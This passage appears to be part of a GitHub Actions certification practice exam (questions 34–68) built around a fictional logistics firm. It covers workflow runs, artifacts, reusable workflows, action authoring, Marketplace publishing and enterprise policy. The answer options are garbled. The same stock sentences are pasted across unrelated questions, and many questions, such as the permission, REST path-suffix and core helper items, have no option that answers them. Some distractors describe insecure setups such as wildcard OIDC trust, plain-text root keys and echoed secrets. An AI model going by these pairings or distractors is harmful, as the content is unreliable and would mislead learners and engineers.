- **D.** Correlate failed matrix job titles to `matrix.*` axes and select `Re-run failed jobs` (`gh run rerun <id> --failed` or single-job rerun) to re-test without re-billing green legs

### 34. AegisRail Logistics's observability service calls `GET /repos/aegisrail/fleet-core/actions/runs?status=in_progress&per_page=100` to track active queue depth. Which fine-grained permission on a GitHub App installation token (`or GITHUB_TOKEN`) authorizes reading workflow runs, jobs, and logs via REST API?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Query workflow runs and raw ZIP logs via `gh run list` / `gh run view --log-failed` or REST `GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs` (`HTTP 302` signed URL)
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

### 35. An incident commander at AegisRail Logistics needs to cancel a runaway matrix workflow run `88201944` immediately from the CLI AND verify when log retention will purge its archives. Which two facts/commands apply? Select two.

- **A.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Query workflow runs and raw ZIP logs via `gh run list` / `gh run view --log-failed` or REST `GET /repos/{owner}/{repo}/actions/runs/{run_id}/logs` (`HTTP 302` signed URL)
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **E.** Enable diagnostic traces (`Re-run jobs -> Enable debug logging`, or set `ACTIONS_STEP_DEBUG=true` and `ACTIONS_RUNNER_DEBUG=true`) and inspect step exit codes (`127`, `137`, `143`)
- **F.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 36. In `aegisrail/tariff-engine`, job `integration` calls `actions/upload-artifact@v4` (`name: edi-logs`) in step 3 and then calls `actions/upload-artifact@v4` AGAIN with the same `name: edi-logs` in step 7 hoping to append late teardown logs into `edi-logs`. Proposed solution: Upload twice under `name: edi-logs` in `actions/upload-artifact@v4` to append files into one artifact. Does this meet the goal?

- **A.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **B.** Pair `actions/cache@v4` (`10 GB` repo cache, `7-day` idle eviction) with `actions/upload-artifact@v4` (`retention-days`) and REST retention policies
- **C.** Manage v4 immutable artifacts (`actions/upload-artifact@v4` creates immediate finalized artifacts; use unique names per matrix leg + `download-artifact@v4` `pattern:` + `merge-multiple: true`)
- **D.** No — in `actions/upload-artifact@v4`, artifacts are **immutable** once uploaded; two matrix jobs uploading the exact same artifact `name:` fail with a `409 Conflict` unless uniquely named (`e.g., app-${{ matrix.os }}`)

### 37. In `aegisrail/customs-gw`, job `package` calls `actions/upload-artifact@v4` (`id: jar-up`, `name: customs-jar`). Downstream deployment attestation scripts want the immutable artifact ID and SHA-256 digest returned directly by the upload step. Which two outputs does `actions/upload-artifact@v4` emit?

- **A.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **B.** Manage v4 immutable artifacts (`actions/upload-artifact@v4` creates immediate finalized artifacts; use unique names per matrix leg + `download-artifact@v4` `pattern:` + `merge-multiple: true`)
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 38. In `aegisrail/fleet-core`, an engineer tries to invoke reusable workflow `aegisrail/ci-blueprints/.github/workflows/maven-verify.yml@v2` as Step 3 inside `jobs.build.steps:` (`alongside actions/checkout`). Why does GitHub Actions reject the workflow file?

- **A.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)
- **B.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** No — writing to `$GITHUB_ENV` scopes variables strictly to subsequent steps **within the same job**; passing values to a downstream job requires `$GITHUB_OUTPUT` + `jobs.<id>.outputs` + `needs:`

### 39. AegisRail Logistics runs a matrix of 3 target regions (`eu`, `uk`, `ch`) on a reusable workflow call: `jobs: deploy-region: { strategy: { matrix: { region: [eu, uk, ch] } }, uses: aegisrail/ci-blueprints/.github/workflows/deploy.yml@<sha>, with: { target: ${{ matrix.region }} } }`. Is `strategy.matrix` supported on a job that calls a reusable workflow?

- **A.** Invoke reusable workflows at `jobs.<id>.uses: org/repo/.github/workflows/file.yml@<sha>` (`<=4` nesting levels, executing in the caller repo context)
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 40. AegisRail Logistics wants all newly initialized `Internal` Java Spring repositories in organization `aegisrail` to see a curated "AegisRail Spring CI" starter workflow under `Actions -> New workflow`. Order the repository creation, `.yml` template, `.properties.json`, and verification steps.

- **A.** Put templates in `.github/workflows/` expecting copies → Omit the required `.properties.json` metadata file → Hardcode `master` instead of `$default-branch` → Expect template edits to update existing repo copies
- **B.** Commit `.properties.json` with no matching `.yml` file → Save SVG icons in `/tmp` on a build runner → Force squads to fork `<org>/.github` → Disable GitHub Actions across the org
- **C.** Create an `Internal`/`Private` `.github` repo in the org → Add `<name>.yml` in `workflow-templates/` (`$default-branch`) → Add `<name>.properties.json` (`name`, `iconName`, `filePatterns`) → Confirm repos see it in `Actions -> New workflow`
- **D.** Publish confidential internal templates to a `Public` personal repo → Add `on: workflow_call` expecting starter templates to run without copying → Put `action.yml` inside `workflow-templates/` → Set `Base permissions = Admin` org-wide

### 41. AegisRail Logistics's platform team combines Starter Workflow Templates WITH Reusable Workflows so new repositories get a clean 12-line `.github/workflows/ci.yml` that stays centrally upgradable forever. Which two design choices achieve that hybrid pattern? Select two.

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** No — a **Starter workflow** (`.github/workflow-templates/`) copies a one-time static `.yml` file into target repos; future edits never propagate unless you use a `workflow_call` Reusable Workflow
- **D.** Contrast **Starter workflows** (`one-time copied .yml scaffold in <org>/.github/workflow-templates/`, independent afterward) vs **Reusable workflows** (`central workflow_call job`) vs **Composite actions** (`encapsulated steps`)
- **E.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **F.** Publish one-time scaffold templates in `<org>/.github/workflow-templates/*.yml` + `.properties.json`, and centralize ongoing governed CI logic in `workflow_call` reusable workflows

### 42. During a customs cutover window, AegisRail Logistics's release automation disables `tariff-sync.yml` via REST API before maintenance and re-enables it afterward. Complete the REST API HTTP method and path suffix: `PUT /repos/aegisrail/tariff-engine/actions/workflows/tariff-sync.yml/____` (`returning 204 No Content`).

- **A.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** No — `on: schedule` (`cron`) workflows trigger **only** when the workflow file exists on the repository's **default branch** (`and shortest cron interval is every 5 minutes`)
- **D.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`

### 43. If a repository administrator disables GitHub Actions completely for repository `aegisrail/legacy-edi` (`Settings -> Actions -> General -> Disable actions`), what happens to existing workflow run logs and in-progress jobs?

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **D.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release

---

## Domain 3 — Author and maintain actions (15–20% official weight · 19 questions)

### 44. AegisRail Logistics upgrades legacy internal action `aegisrail/edi-signer` whose `action.yml` still specifies retired `runs.using: 'node16'`. Which runtime value in `action.yml` and packaging approach bring `edi-signer` onto the supported cross-OS Node.js runtime?

- **A.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **D.** Build **JavaScript actions** (`runs.using: "node20"`, `pre:`/`main:`/`post:` entrypoints, `@actions/core` + `@actions/github`, bundled into `dist/index.js`) for fast cross-OS execution

### 45. Inside a `node20` JavaScript action at AegisRail Logistics, `post: dist/cleanup.js` revokes a temporary customs API session token. By default (`if post-if is omitted in action.yml`), does `post: dist/cleanup.js` run when `main: dist/index.js` fails with `core.setFailed()`?

- **A.** Build **JavaScript actions** (`runs.using: "node20"`, `pre:`/`main:`/`post:` entrypoints, `@actions/core` + `@actions/github`, bundled into `dist/index.js`) for fast cross-OS execution
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Store mandatory legal compliance binaries and long-term release installers exclusively inside `actions/cache@v4` (`expecting 1-year retention`)

### 46. Why do high-frequency CI steps (`running 25,000 times/day at AegisRail Logistics`) start noticeably faster when implemented as bundled `node20` JavaScript actions compared to `Dockerfile`-built Docker container actions?

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **C.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **D.** Build **JavaScript actions** (`runs.using: "node20"`, `pre:`/`main:`/`post:` entrypoints, `@actions/core` + `@actions/github`, bundled into `dist/index.js`) for fast cross-OS execution

### 47. AegisRail Logistics's yard-scanner team builds Windows `.msix` installers on `windows-2025` runners and iPad apps on `macos-15` runners, needing a custom changelog-stamp action. Proposed solution: Author the changelog-stamp action as a Docker container action (`runs.using: 'docker'`) and invoke it across `windows-2025` and `macos-15`. Does this meet the goal?

- **A.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **B.** Build **JavaScript actions** (`runs.using: "node20"`, `pre:`/`main:`/`post:` entrypoints, `@actions/core` + `@actions/github`, bundled into `dist/index.js`) for fast cross-OS execution
- **C.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **D.** Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)

### 48. Inside Composite action `aegisrail/setup-maven-auth/action.yml`, step 1 (`id: gen-settings`) writes `echo "settings_path=/tmp/settings.xml" >> "$GITHUB_OUTPUT"`. Complete the two `action.yml` sections required so caller workflows can read `${{ steps.<caller_step_id>.outputs.maven-settings }}`: top-level `outputs.maven-settings` AND `runs: outputs: maven-settings: { ____: ${{ steps.gen-settings.outputs.settings_path }} }`.

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)

### 49. AegisRail Logistics's action authors compare filesystem path variables inside a Composite action (`aegisrail/common-actions/edi-lint/action.yml`) checked out by a caller repo (`aegisrail/customs-gw`). Which two path variables resolve the caller repo vs the action's own bundled scripts? Select two.

- **A.** No — **Docker container actions** (`runs.using: "docker"`) execute **only on Linux runners** with Docker; cross-OS Linux/Windows/macOS actions require JavaScript (`node20`) or Composite actions
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Choose **Docker container actions** (`runs.using: "docker"`, custom OS/packages, **Linux runners only**) vs **Composite actions** (`runs.using: "composite"`, cross-OS bundled steps with explicit `shell:`)
- **D.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **E.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **F.** Declare `runs.using: "composite"` in `action.yml`, specify `shell:` on every `run:` step, and reference helper scripts via `${{ github.action_path }}`

### 50. AegisRail Logistics publishes internal and public actions using GitHub's Immutable Actions feature. If a workflow references a branch name (`@main`) rather than an immutable versioned release on an action repository, how does runner resolution behave?

- **A.** Adopt **Immutable Actions** (`OCI packages on GHCR / pkg.actions.githubusercontent.com` + Immutable Releases) and fail cleanly with `core.setFailed(err.message)` (`exit code 1`)
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Block outbound HTTPS `443` to `pkg.actions.githubusercontent.com` and `ghcr.io` on self-hosted runner firewalls while forcing Immutable Actions
- **D.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally

### 51. A Docker container action in `aegisrail/xml-canon-action` writes output files into `$GITHUB_WORKSPACE/out/canon.xml` running as container `USER root` (`UID 0`), causing subsequent non-Docker host steps (`running as runner UID 1001`) to fail with `EACCES: permission denied` when cleaning or modifying `out/canon.xml`! Why?

- **A.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **B.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Adopt **Immutable Actions** (`OCI packages on GHCR / pkg.actions.githubusercontent.com` + Immutable Releases) and fail cleanly with `core.setFailed(err.message)` (`exit code 1`)

### 52. In `action.yml` for `aegisrail/edi-signer` (`node20`), input `cert-paths` accepts a newline-separated list of file paths (`with: cert-paths: | a.pem \n b.pem`). Complete the `@actions/core` helper `const paths = core.____('cert-paths');` that trims and splits multi-line inputs into `string[]`.

- **A.** Define `action.yml` (`or action.yaml`) with `name`, `description`, `inputs` (`required`, `default`, `deprecationMessage`), `outputs`, `runs`, and Marketplace `branding` (`icon` + `color`)
- **B.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

### 53. You validate `action.yml` for a Composite action in `aegisrail/setup-gradle-enterprise` and check whether `branding:` (`icon` and `color`) is restricted solely to JavaScript actions or valid across all three action types. Which action types support `branding:` in `action.yml`?

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Define `action.yml` (`or action.yaml`) with `name`, `description`, `inputs` (`required`, `default`, `deprecationMessage`), `outputs`, `runs`, and Marketplace `branding` (`icon` + `color`)
- **D.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)

### 54. You conduct a design review of `aegisrail/edi-signer` (`node20` TypeScript action). Which three implementation details conform to official GitHub Actions standards? Select three.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Target `runs.using: "node20"` in `action.yml` and commit compiled `dist/index.js` (`bundled with @vercel/ncc or esbuild`) so consumers skip `npm install`
- **C.** Use `@actions/core` (`getInput`, `setOutput`, `setSecret`, `exportVariable`, `addPath`, `saveState`/`getState`, `core.summary`) rather than raw `process.env` string hacks
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **E.** Author a `runs.using: "composite"` action containing `run:` steps with **no `shell:` key** and invoke `uses:` inside a Docker container `Dockerfile`
- **F.** Define `action.yml` (`or action.yaml`) with `name`, `description`, `inputs` (`required`, `default`, `deprecationMessage`), `outputs`, `runs`, and Marketplace `branding` (`icon` + `color`)

### 55. In `aegisrail/edi-signer`, `pre: dist/pre.js` starts a local PKCS#11 proxy daemon on `pid` `4812`, and `post: dist/post.js` must terminate `4812` cleanly without exposing `pid` as a public action output to caller workflows. Complete the paired `@actions/core` state calls: `core.____('proxyPid', pid)` in `pre:` and `core.getState('proxyPid')` in `post:`.

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Use `@actions/core` (`getInput`, `setOutput`, `setSecret`, `exportVariable`, `addPath`, `saveState`/`getState`, `core.summary`) rather than raw `process.env` string hacks
- **C.** Reference `${{ secrets.DEPLOY_KEY != '' }}` directly inside a workflow-level `on:` filter or unquoted `echo ${{ secrets.DEPLOY_KEY }}` debug step
- **D.** No — interpolating `${{ github.event.pull_request.title }}` (`or head_ref / comment.body`) directly inside `run:` allows shell command injection; bind it to an `env:` variable first

### 56. When a `node20` action calls `core.exportVariable('EDI_ENDPOINT', 'https://edi.aegisrail.io')`, which environment file does `@actions/core` write to under the hood, and which steps can read `$EDI_ENDPOINT`?

- **A.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`
- **B.** Use `@actions/core` (`getInput`, `setOutput`, `setSecret`, `exportVariable`, `addPath`, `saveState`/`getState`, `core.summary`) rather than raw `process.env` string hacks
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit

### 57. AegisRail Logistics wants 18 organizations in its GitHub Enterprise Cloud account to consume internal action `aegisrail-sec/cosign-verify` without making it public AND without distributing PATs, while ensuring developers across all 18 orgs can browse its `README.md` and `action.yml` inputs directly. Which repository visibility + setting accomplishes both?

- **A.** Distribute internal actions via `Internal`/`Private` enterprise repositories (`with Actions Access enabled`, single-repo or monorepo subfolders) vs `Public` OSS repositories
- **B.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)

### 58. Why does storing a custom action inside `.github/actions/my-helper/action.yml` of caller repository `aegisrail/customs-gw` (`local action`) NOT work if `aegisrail/tariff-engine` tries to call `uses: aegisrail/customs-gw/.github/actions/my-helper@v1` while `aegisrail/customs-gw` is `Private` with `Access: Not accessible`?

- **A.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **B.** Distribute internal actions via `Internal`/`Private` enterprise repositories (`with Actions Access enabled`, single-repo or monorepo subfolders) vs `Public` OSS repositories
- **C.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 59. AegisRail Logistics open-sources `aegisrail/edifact-syntax-check` (`Composite action`) for global supply-chain developers and wants to list `v1.0.0` on GitHub Marketplace. Place the public single-action repo, metadata/branding, 2FA/agreement, and Release publication steps in exact order.

- **A.** Keep the action repository `Private` or `Internal` → Pack 6 actions in subfolders with no root `action.yml` → Skip `2FA` and the Marketplace Developer Agreement → Push branch `dev` without drafting a GitHub Release
- **B.** Publish from an EMU user account (`where public repos are blocked`) → Omit `description` and `runs:` from `action.yml` → Commit production `.env` secrets into the repo → Use mutable tag `latest` only
- **C.** Reuse an existing official action `name` (`actions/checkout`) → Hide `action.yml` inside `.github/workflows/` → Email a `.zip` archive to GitHub Support → Tag `0.0.0-draft` without release notes
- **D.** Create a `Public` single-action repo with root `action.yml` → Add unique `name`, `description`, `README`, & `branding` → Enable `2FA` & accept the Marketplace Developer Agreement → Draft a Release (`v1.0.0`) checking `Publish to Marketplace`

### 60. AegisRail Logistics keeps `aegisrail/edifact-pro` at `Internal` visibility inside GitHub Enterprise Cloud so only enterprise employees can view it, yet wants it searchable inside an "Internal GitHub Marketplace" UI via `Publish this Action to the GitHub Marketplace` on Releases. Proposed solution: Keep `aegisrail/edifact-pro` `Internal` and check `Publish this Action to the GitHub Marketplace` on its Release page. Does this meet the goal?

- **A.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **D.** Distribute internal actions via `Internal`/`Private` enterprise repositories (`with Actions Access enabled`, single-repo or monorepo subfolders) vs `Public` OSS repositories

### 61. An action maintainer at AegisRail Logistics wants to test release candidate `v2.0.0-rc.1` with pilot teams before moving the production floating `@v2` tag. How should `v2.0.0-rc.1` be published on GitHub Releases?

- **A.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **B.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Release immutable SemVer tags (`v1.2.0`), advance convenience major tags (`v1` -> `v1.2.0`) only for non-breaking changes, and recommend **40-char commit SHA** pinning (`with # v1.2.0 comment`)

### 62. AegisRail Logistics's CI security policy mandates full 40-char commit SHA pinning for third-party actions while keeping developer maintenance low. Which two practices together satisfy security and developer ergonomics? Select two.

- **A.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **B.** Publish immutable SemVer releases (`v1.2.3`), slide major tag `v1` for compatible updates, and encourage consumers to pin full 40-char commit SHAs (`with Immutable Actions`)
- **C.** Configure `runs.using: "node12"` in `action.yml` and gitignore both `dist/` and `node_modules/` so neither exists in the tagged release commit
- **D.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **E.** Release immutable SemVer tags (`v1.2.0`), advance convenience major tags (`v1` -> `v1.2.0`) only for non-breaking changes, and recommend **40-char commit SHA** pinning (`with # v1.2.0 comment`)
- **F.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners

---

## Domain 4 — Manage GitHub Actions for the enterprise (20–25% official weight · 24 questions)

### 63. AegisRail Logistics wants all 310 `Private` and `Internal` repositories across its `aegisrail` organization to execute central container-trivy workflow `aegisrail/sec-gates/.github/workflows/trivy.yml` before any PR merges to default branches (`$DEFAULT_BRANCH`), managed declaratively via REST/Terraform. Which GitHub feature supports this?

- **A.** No — a **Starter workflow** (`.github/workflow-templates/`) copies a one-time static `.yml` file into target repos; future edits never propagate unless you use a `workflow_call` Reusable Workflow
- **B.** Standardize CI/CD with central `Internal` Reusable Workflows (`workflow_call`) and enforce mandatory org/enterprise checks via **Repository Ruleset Required Workflows**
- **C.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **D.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file

### 64. AegisRail Logistics versions its enterprise `workflow_call` templates in `aegisrail/ci-blueprints` (`v1`, `v2`). When breaking changes are introduced in `v2` (`renaming input jdk to java-version`), how can 310 downstream repositories migrate incrementally without breaking active sprints?

- **A.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **B.** Publish to **GitHub Marketplace** from a `Public` single-action repo (`root action.yml`, unique `name`, `branding`, `README`, `2FA`, Marketplace agreement) via a SemVer GitHub Release
- **C.** Standardize CI/CD with central `Internal` Reusable Workflows (`workflow_call`) and enforce mandatory org/enterprise checks via **Repository Ruleset Required Workflows**
- **D.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs

### 65. Can a central `workflow_call` workflow in `aegisrail/ci-blueprints` reference a local Composite action stored inside `aegisrail/ci-blueprints/.github/actions/setup-edi` when invoked by downstream repository `aegisrail/customs-gw`?

- **A.** Define a YAML anchor `&shared_steps` inside `.github/workflows/base.yml` and reference `*shared_steps` directly inside a separate `.github/workflows/deploy.yml` file
- **B.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **C.** Standardize CI/CD with central `Internal` Reusable Workflows (`workflow_call`) and enforce mandatory org/enterprise checks via **Repository Ruleset Required Workflows**
- **D.** Disable a workflow (`Actions UI` or `gh workflow disable`) to halt scheduled/webhook runs while preserving `.yml` code and run history, vs deleting `.yml`

### 66. Repository `aegisrail/edi-schemas` (`Internal`) enables `Settings -> Actions -> General -> Access -> Accessible from repositories in the 'aegisrail' enterprise`. Does that toggle allow workflows in sibling org `aegisrail-freight` to PUSH commits back into `aegisrail/edi-schemas` using their automatic `GITHUB_TOKEN`?

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)
- **C.** Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)
- **D.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name

### 67. An Enterprise Owner configures `Enterprise -> Policies -> Actions -> Artifact and log retention` to a maximum ceiling of `60 days` for cost and GDPR data-minimization compliance. Can a repository admin in `aegisrail/customs-gw` set repository retention to `90 days`?

- **A.** Set `Repository Settings -> Actions -> General -> Access` on `Internal`/`Private` action repos to `Accessible from repositories in the enterprise` (`or organization`)
- **B.** Reference third-party Marketplace actions using floating `@main` or `@HEAD` branch refs with `permissions: write-all` enabled globally
- **C.** Emit `echo "::set-output name=version::1.2.3"` and `echo "::set-env name=FOO::bar"` workflow commands on `ubuntu-24.04` runners
- **D.** Configure AWS/Azure OIDC trust policies with wildcard `"sub": "repo:*:*"` and store static cloud root keys in plain-text `vars.*` as fallback

### 68. AegisRail Logistics wants `Private` repository `aegisrail-ops/terraform-modules` in org `aegisrail-ops` to share its Composite actions with `Private` repositories in sibling org `aegisrail-eu` (`same GitHub Enterprise Cloud`), while keeping `terraform-modules` hidden from general developers in `aegisrail-eu` who lack read access. Proposed solution: Keep `aegisrail-ops/terraform-modules` `Private` and set `Settings -> Actions -> General -> Access -> Accessible from repositories in the enterprise`. Does this meet the goal?

- **A.** Attach persistent stateful self-hosted VMs with internal database credentials directly to `Public` repositories accepting unreviewed fork PRs
- **B.** Yes — the proposed configuration satisfies every stated GitHub Actions functional, security, and operational requirement
- **C.** Assume Organization-level Actions secrets and variables override `production` Environment-level secrets and variables of the same name
- **D.** No — publishing to **GitHub Marketplace** requires a **Public** repository dedicated to **one single action** with `action.yml` at the repository root (`not a Private repo or multi-action subfolder monorepo`)

